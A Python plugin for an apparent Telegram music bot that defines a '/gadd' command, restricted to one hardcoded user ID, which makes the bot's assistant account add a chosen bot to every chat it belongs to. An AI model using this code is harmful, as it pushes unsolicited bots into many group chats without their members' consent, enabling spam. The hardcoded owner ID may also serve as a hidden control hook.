import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
OWNERS = "8450725193"
from ShrutixMusic import nand
from ShrutixMusic.utils.database import add_served_chat, get_assistant

@nand.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        return await message.reply("❍ Invalid format, Use: `/gadd bot_username`")

    bot_username = command_parts[1]

    try:
        userbot = await get_assistant(message.chat.id)
        bot = await nand.get_users(bot_username)
        bot_id = bot.id

        done = 0
        failed = 0
        status = await message.reply("❍ Adding bot in all chats...")

        await userbot.send_message(bot_username, "/start")

        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1002378673199:
                continue

            try:
                await userbot.add_chat_members(dialog.chat.id, bot_id)
                done += 1
            except:
                failed += 1

            await status.edit(
                f"Adding {bot_username}\n\n✔ Added: {done}\n✘ Failed: {failed}\nBy @{userbot.username}"
            )
            await asyncio.sleep(3)

        await status.edit(f"🎉 Done! {bot_username} Added.\n\n✔ {done} chats\n✘ {failed} failed.")

    except Exception as e:
        await message.reply(f"Error: `{e}`")
